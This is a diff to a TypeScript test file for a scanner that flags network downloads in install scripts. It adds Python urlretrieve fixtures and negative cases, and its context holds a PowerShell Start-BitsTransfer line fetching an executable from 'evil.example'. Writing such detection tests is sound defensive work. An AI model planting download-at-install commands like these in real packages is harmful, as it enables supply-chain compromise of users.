@@ -44,6 +44,16 @@ const DOWNLOADS: Record<string, [string, string, string]> = {
     "Start-BitsTransfer -Source https://evil.example/x.exe -Destination x.exe\n",
     "https://evil.example/x.exe",
   ],
+  "urllib.request.urlretrieve in a Python install script": [
+    "setup.py",
+    "import urllib.request\nurllib.request.urlretrieve('https://example.com/tool.tar.gz', 'tool.tar.gz')\n",
+    "https://example.com/tool.tar.gz",
+  ],
+  "bare urlretrieve in a Python install script": [
+    "setup.py",
+    "from urllib.request import urlretrieve\nurlretrieve('https://example.com/asset.zip', 'asset.zip')\n",
+    "https://example.com/asset.zip",
+  ],
 };
 
 test("install-time downloads from the named tools are collected", () => {
@@ -76,6 +86,11 @@ test("local-file invocations of the same tools collect nothing", () => {
     ["install.bat", "bitsadmin /list\n"],
     ["install.sh", "#!/bin/sh\naria2c local.torrent\n"],
     ["install.sh", "#!/bin/sh\naxel -o local-copy.bin local.bin\n"],
+    [
+      "setup.py",
+      "import urllib.request\nurllib.request.urlretrieve('local.tar.gz', 'dest.tar.gz')\n",
+    ],
+    ["setup.py", "not_urlretrieve('https://example.com/evil')\n"],
   ] as const) {
     const inspection = inspected(path, body);
     expect({ body, downloads: inspection.downloads }).toEqual({
